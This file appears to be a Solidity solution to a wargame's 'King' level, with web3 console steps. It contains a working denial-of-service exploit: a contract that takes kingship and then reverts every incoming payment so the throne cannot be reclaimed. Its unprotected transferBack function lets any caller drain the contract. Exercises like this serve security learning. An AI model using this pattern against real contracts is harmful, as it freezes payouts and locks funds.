// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/King.sol';

contract HackKing {
    // Complete with the address of the instance
    King public king = King(payable(0x1CE41Bc8C1907233954737Dae8Ab1D7E0aa7Bbda));

    // Allow your contract to receive ether throw this function
    // Send at least 1 ether to your contract
    function receiveEther() public payable {
    }

    // This function it's not need it
    // it's just in case you miss something you can recover the ether you send to this contract
    function transferBack(address myAddress, uint256 toReceiveBack) public {
        address(myAddress).call{value: toReceiveBack}("");
    }

    // Call the fallback function of the contract with this function and send 1 ether
    function becomeKing() public {
        address(king).call{value: 1 ether}("");
    }

    receive() external payable {
        revert('This way you prevent the level to reclaim ownership once you submit the instance');
    }
}
/*
    The first thing you need to do is to send 1 ether to this HackKing contract
    In order to do so, we need to instance our HackKing contract throw the console
    First you're going to save the abi in variable and the HackKing contract's address in another
    -let abi = []
    -let myContractAddress = "0xA2FCbfE666CF1FEE8dbdFC68FA4C2627504002Ed"

    Then you're going to instance the HackKing contract
    -let myContract = new web3.eth.Contract(abi, myContractAddress)

    Finally, you're going to send 1 ether to the contract using the receiveEther function
    -await myContract.methods.receiveEther().send({from: player, to: myContractAddress, value: toWei("1")})

    Then call the function becomeKing and you will be the next king of the game

*/
